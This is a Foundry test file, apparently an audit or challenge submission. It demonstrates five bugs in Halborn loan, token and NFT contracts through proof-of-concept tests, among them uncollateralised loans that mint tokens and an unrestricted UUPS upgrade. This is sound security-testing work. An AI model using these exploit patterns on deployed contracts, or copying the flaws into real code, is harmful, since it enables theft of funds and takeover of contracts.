// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {Merkle} from "./murky/Merkle.sol";

import {HalbornNFT} from "../src/HalbornNFT.sol";
import {HalbornToken} from "../src/HalbornToken.sol";
import {HalbornLoans} from "../src/HalbornLoans.sol";
import {Upgrades} from "../lib/openzeppelin-foundry-upgrades/src/Upgrades.sol";
import {Options} from "../lib/openzeppelin-foundry-upgrades/src/Upgrades.sol";

contract HalbornTest is Test {
    address public immutable ALICE = makeAddr("ALICE");
    address public immutable BOB = makeAddr("BOB");

    bytes32[] public ALICE_PROOF_1;
    bytes32[] public ALICE_PROOF_2;
    bytes32[] public BOB_PROOF_1;
    bytes32[] public BOB_PROOF_2;

    HalbornNFT public nft;
    HalbornToken public token;
    HalbornLoans public loans;

    function setUp() public {
        // Initialize
        Merkle m = new Merkle();
        // Test Data
        bytes32[] memory data = new bytes32[](4);
        data[0] = keccak256(abi.encodePacked(ALICE, uint256(15)));
        data[1] = keccak256(abi.encodePacked(ALICE, uint256(19)));
        data[2] = keccak256(abi.encodePacked(BOB, uint256(21)));
        data[3] = keccak256(abi.encodePacked(BOB, uint256(24)));

        // Get Merkle Root
        bytes32 root = m.getRoot(data);

        // Get Proofs
        ALICE_PROOF_1 = m.getProof(data, 0);
        ALICE_PROOF_2 = m.getProof(data, 1);
        BOB_PROOF_1 = m.getProof(data, 2);
        BOB_PROOF_2 = m.getProof(data, 3);

        assertTrue(m.verifyProof(root, ALICE_PROOF_1, data[0]));
        assertTrue(m.verifyProof(root, ALICE_PROOF_2, data[1]));
        assertTrue(m.verifyProof(root, BOB_PROOF_1, data[2]));
        assertTrue(m.verifyProof(root, BOB_PROOF_2, data[3]));

        nft = new HalbornNFT();
        nft.initialize(root, 1 ether);

        token = new HalbornToken();
        token.initialize();

        loans = new HalbornLoans(2 ether);
        loans.initialize(address(token), address(nft));

        token.setLoans(address(loans));
    }

    //vulnurability 1
    // Halborn Loans : Line 60 
    //totalCollateral[msg.sender] - usedCollateral[msg.sender] < amount 
    //allows user with 0 deposited NFT collateral to take a loan and increase the usedCollateral
    function test_GetLoan_NoCollateral(uint256 amount) public {
        //ALICE is a user with no initial balance of `token` and 0 `totalCollateral`
        vm.assume(amount > 2 ether);

        assert(token.balanceOf(ALICE) == 0);
        assert(loans.totalCollateral(ALICE)==0);

        //ALICE calls get loans with any random `amount` greater than 2 ether
        vm.prank(ALICE);
        loans.getLoan(amount);

        //Halborn token is minted to ALICE
        assert(token.balanceOf(ALICE) == amount);
        assert(token.totalSupply() == amount);
        //Used collateral increased
        assert(loans.usedCollateral(ALICE)==amount);
        //Total collateral is 0
        assert(loans.totalCollateral(ALICE)==0);
    }

    //vulnurability 2
    //Halborn Loan contract will never be able to receive collateral with depositCollateral
    //it does not impliment IERC721Receiver.onERC721Received
    function test_depositNFTCollateral_FailAsNoOnMessageReceive() public {
        address user = vm.addr(1);
        
        mintNFTToUser(user); //user holds NFT
        uint id = nft.idCounter();
        
        vm.startPrank(user);
        //user tries to deposits NFT as collateral but it will fail
        nft.approve(address(loans), id);
        vm.expectRevert();
        loans.depositNFTCollateral(id);

        vm.stopPrank();
    } 


    //vulnurability 3
    //returnLoan mistakenly increases usedCollateral instead of decreasing it. 
    //This seems like a logical error.
    function test_BurnToken_IncreasesUsedCollateral() public {
        
        address user = vm.addr(1);
        
        vm.startPrank(user);

        //user takes loan
        loans.getLoan(4 ether);

        //user repays half of the loan
        loans.returnLoan(2 ether);
        vm.stopPrank();

        //increased 
        assert(loans.usedCollateral(user) == 6 ether);
        assert(loans.totalCollateral(user) == 0);
    }

    function mintNFTToUser(address user) private {
        deal(user,nft.price());
        vm.startPrank(user);
        nft.mintBuyWithETH{value: nft.price()}();
        vm.stopPrank();
    }

    //vulnurability 4
    //Missing access restriction to the upgrade mechanism
    //All 3 contracrs override the authorised `_authorizeUpgrade` of UUPS
    //but do not have any access-modifier
    //thus anyone can upgrade the implimentation
    //example : HalbornToken
    function test_UUPS_UnAuthorisedUpgrade() public {
        address randomUser = vm.addr(1);
        //Deploy UUPS proxy
        string memory contractName = "HalbornToken.sol";
        bytes memory initData;
        Options memory opt;
        address proxy = Upgrades.deployUUPSProxy(contractName, initData, opt);

        //current implimentation address
        address impl = Upgrades.getImplementationAddress(proxy);

        assert(impl != address(0));

        //trying out upgrading the proxy with random address, should succeed
        Upgrades.upgradeProxy(proxy,"HalbornTokenV2.sol",initData, opt, randomUser);
        address newImpl = Upgrades.getImplementationAddress(proxy);

        assert(newImpl!=impl && newImpl!=address(0));
    }

    //vulnurability 5
    //HalbornNFT : line 60 : require(_exists(id), "Token already minted");
    //Should be require(!_exists(id))
    //User will not be able to mint token through merkle proof mechansim
    function test_HalbornNFT_mintAirdrops() public {
        //We will try to min NFT id : 15
        vm.expectRevert(); //Revert means owner does not exist
        nft.ownerOf(15);

        vm.startPrank(ALICE);
        vm.expectRevert("Token already minted");
        nft.mintAirdrops(15, ALICE_PROOF_1);
        vm.stopPrank();
    }
}
